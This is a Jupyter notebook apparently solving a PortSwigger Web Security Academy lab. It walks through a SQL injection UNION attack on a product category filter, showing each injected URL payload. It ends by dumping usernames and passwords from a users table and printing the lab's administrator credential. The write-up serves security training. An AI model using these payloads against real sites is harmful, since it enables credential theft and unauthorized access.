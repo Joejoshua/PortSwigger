{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: SQL injection UNION attack, retrieving data from other tables\n",
    "\n",
    "- sqli: product category filter\n",
    "- end goal: retrieves all usernames and passwords table, and login as the administrator user"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "- url: `https://0a330051041e72da80d4543400ba0002.web-security-academy.net`\n",
    "\n",
    "- front-end: `/filter?category=Food+%26+Drink`\n",
    "- back-end: \n",
    "```sql\n",
    "select * from product where category = 'Food & Drink' and released = 1 \n",
    "```\n",
    "\n",
    "- check sqli vulnerability\n",
    "- front-end: `/filter?category=Food+%26+Drink'`\n",
    "- back-end: \n",
    "```sql\n",
    "select * from product where category = 'Food & Drink'' and released = 1 \n",
    "'-- 500 Internal Server Error\n",
    "```\n",
    "\n",
    "- front-end: `/filter?category=Food+%26+Drink'--`\n",
    "- back-end: \n",
    "```sql\n",
    "select * from product where category = 'Food & Drink'-- and released = 1 \n",
    "-- 200 OK: this website have sqli vulnerability\n",
    "```\n",
    "\n",
    "- determine how many columns which contain in this website\n",
    "- front-end: `/filter?category=Food+%26+Drink' order by 2--`\n",
    "- back-end: \n",
    "```sql\n",
    "select * from product where category = 'Food & Drink' order by 2-- and released = 1 \n",
    "-- 200 OK: I found 2 columns\n",
    "```\n",
    "\n",
    "- determine how many strings which containing in the columns\n",
    "- front-end: `/filter?category=Food+%26+Drink' union select 'text', 'text'--`\n",
    "- back-end: \n",
    "```sql\n",
    "select * from product where category = 'Food & Drink' union select 'text', 'text'-- and released = 1 \n",
    "-- 200 OK: both columns are text \n",
    "```\n",
    "\n",
    "- find usernames and passwords tables from users column\n",
    "- front-end: `/filter?category=Food+%26+Drink' union select username, password from users--`\n",
    "- back-end: \n",
    "```sql\n",
    "select * from product where category = 'Food & Drink' union select username, password from users-- and released = 1 \n",
    "-- 200 OK: administrator:zsh94tgxsd2wt7o9onjc\n",
    "```\n",
    "- login as administrator acount\n",
    "- Congratulations, you solved the lab!"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
